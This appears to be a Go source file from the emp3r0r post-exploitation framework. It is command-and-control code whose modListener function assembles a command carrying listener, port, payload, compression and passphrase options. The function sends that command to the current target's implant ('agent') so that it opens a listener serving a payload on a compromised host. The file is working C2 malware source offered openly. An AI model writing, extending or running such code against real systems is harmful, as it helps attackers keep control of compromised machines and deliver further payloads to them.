package cc

import (
	"fmt"

	"github.com/fatih/color"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func modListener() {
	cmd := fmt.Sprintf("%s --listener %s --port %s --payload %s --compression %s --passphrase %s",
		emp3r0r_data.C2CmdListener,
		Options["listener"].Val,
		Options["port"].Val,
		Options["payload"].Val,
		Options["compression"].Val,
		Options["passphrase"].Val)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
